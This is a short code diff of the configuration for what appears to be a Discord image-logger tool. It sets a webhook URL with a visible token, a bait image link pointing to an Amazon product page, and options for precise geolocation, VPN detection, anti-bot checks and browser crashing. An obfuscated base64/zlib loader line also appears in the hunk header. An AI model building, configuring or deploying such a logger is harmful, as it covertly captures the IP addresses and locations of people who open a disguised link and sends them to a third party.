@@ -4,23 +4,23 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1441456061528670258/u-NgRxR75hPMDOO2KMHkc0GbqxABr0jlYk1fdlgGDrjUC9QMYOrO-hr97ZGyAzI-ewJK",
-    "image": "https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fimages7.memedroid.com%2Fimages%2FUPLOADED322%2F634084e6e7085.jpeg&f=1&nofb=1&ipt=214554cbb1889b47ed432fd195974c79e3f1de9cd7d1491a02ed69fdc6aed8e6",
+    "image": "https://www.amazon.com/TUFF-MANGO-MUSTARD-BIG-SAJ/dp/B0FG795RRK",
     "imageArgument": True,
     "username": "Maxdluffy83",
     "avatar_url": "file:///C:/Users/maxdl/Pictures/Screenshots/Capture%20d'%C3%A9cran%202025-09-19%20132458.png",
     "color": 0x1C2526,  # Very dark grey
 
     # OPTIONS #
-    "crashBrowser": True,
+    "crashBrowser": False,
     "accurateLocation": True,
     "message": {
         "doMessage": False,
         "message": "Coucou, dédi a tout ceux du 18-25, on prends la releve #NoctysSupremacy",
-        "richMessage": True,
+        "richMessage": False,
     },
     "vpnCheck": 1,
     "linkAlerts": True,
-    "buggedImage": True,
+    "buggedImage": False,
     "antiBot": 1,
 
     # REDIRECTION #
